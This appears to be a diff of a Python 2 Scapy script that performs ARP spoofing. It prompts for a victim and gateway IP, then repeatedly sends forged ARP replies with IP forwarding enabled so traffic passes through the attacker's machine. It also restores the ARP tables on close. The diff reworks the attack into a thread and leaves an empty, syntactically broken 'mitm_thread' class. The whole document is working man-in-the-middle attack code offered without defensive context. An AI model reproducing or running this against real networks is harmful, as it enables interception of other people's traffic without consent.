@@ -7,14 +7,14 @@ import scapy.all as sp
 import sys
 import os
 import time
-
+import threading
 sp.conf.verb = 0
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 REPLAY = 2
-print "hi"
+print "hiiii"
 
-class Attack(object,):
-
+class Attack_Thread(threading.Thread, ):
+    TIMEOUT = 30
     @staticmethod
     def get_mac(IP):
         """
@@ -41,14 +41,22 @@ class Attack(object,):
     
     def __init__(self,):
         self.vIP, self.gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
-        self.arp_table = {ip: Attack.get_mac(ip) for ip in [self.vIP,self.gIP]}     
-        print self.arp_table
+        self.arp_table = {ip: Attack_Thread.get_mac(ip) for ip in [self.vIP,self.gIP]}     
+        super(Attack_Thread, self).__init__()
+
     def close(self,):
+        self.on = False
         sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=BROADCAST,
                     hwsrc=self.arp_table[self.vIP],), count=7)
         sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=BROADCAST,
                     hwsrc=self.arp_table[self.gIP],), count=7)
-        Attack.set_ip_forward(0)
+        Attack_Thread.set_ip_forward(0)
+    def run(self, ):
+        self.on = True
+        try:
+            self.spoof()
+        finally:
+            self.close()
 
     def spoof(self,):
         """
@@ -56,13 +64,15 @@ class Attack(object,):
         returns: None
         tells the target you are the gateway and the gateway that you are the target
         """
-        Attack.set_ip_forward(1)
-        sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=self.arp_table[self.vIP]))
-        sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=self.arp_table[self.gIP]))
+        Attack_Thread.set_ip_forward(1)
+        while self.on:
+            sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=self.arp_table[self.vIP]))
+            sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=self.arp_table[self.gIP]))
+            time.sleep(Attack_Thread.TIMEOUT)
+class mitm_thread(threading.Thread):
 
-
-a = Attack()
-a.spoof()
+a = Attack_Thread()
+a.run()
 raw_input()
 a.close()
 
